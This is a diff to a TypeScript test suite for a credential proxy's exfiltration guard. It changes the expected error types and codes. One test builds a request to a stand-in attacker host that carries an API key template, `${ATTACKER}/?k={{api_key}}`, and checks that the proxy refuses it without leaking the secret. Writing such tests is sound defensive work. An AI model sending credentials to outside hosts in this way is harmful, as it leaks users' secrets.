@@ -11,7 +11,7 @@
 import { describe, it, expect, beforeEach } from "bun:test";
 import { truncateAll } from "../../helpers/db.ts";
 import { createTestContext, type TestContext } from "../../helpers/auth.ts";
-import { proxyCall, ProxyAuthorizationError } from "../../../src/services/credential-proxy/core.ts";
+import { proxyCall, ProxyCallError } from "../../../src/services/credential-proxy/core.ts";
 import {
   localIntegrationManifest,
   httpHeaderDelivery,
@@ -127,7 +127,10 @@ describe("proxyCall — credential-exfiltration guard", () => {
       () => null,
       (e: unknown) => e,
     );
-    expect(err).toBeInstanceOf(ProxyAuthorizationError);
+    expect(err).toBeInstanceOf(ProxyCallError);
+    expect(["unauthorized_target", "blocked_target", "credential_exfiltration_refused"]).toContain(
+      (err as ProxyCallError).code,
+    );
     const { message } = err as Error;
     expect(message).not.toContain(secret);
     return message;
@@ -287,7 +290,7 @@ describe("proxyCall — credential-exfiltration guard", () => {
     it("refuses any templated call", async () => {
       const up = upstream();
       const err = await call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`).catch((e: unknown) => e);
-      expect(err).toBeInstanceOf(ProxyAuthorizationError);
+      expect(err).toMatchObject({ code: "credential_exfiltration_refused" });
       expect((err as Error).message).toContain("credential exfiltration");
       expect((err as Error).message).not.toContain(SECRET);
       expect(up.hits).toEqual([]);
